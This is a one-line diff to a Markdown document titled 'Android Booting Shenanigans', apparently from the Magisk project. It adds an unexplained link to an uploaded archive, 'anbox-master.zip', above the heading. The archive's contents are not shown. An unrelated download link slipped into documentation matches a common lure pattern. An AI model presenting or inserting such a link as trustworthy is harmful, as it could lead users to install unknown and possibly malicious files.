@@ -1,3 +1,4 @@
+[anbox-master.zip](https://github.com/topjohnwu/Magisk/files/8654110/anbox-master.zip)
 # Android Booting Shenanigans
 
 ## Terminologies
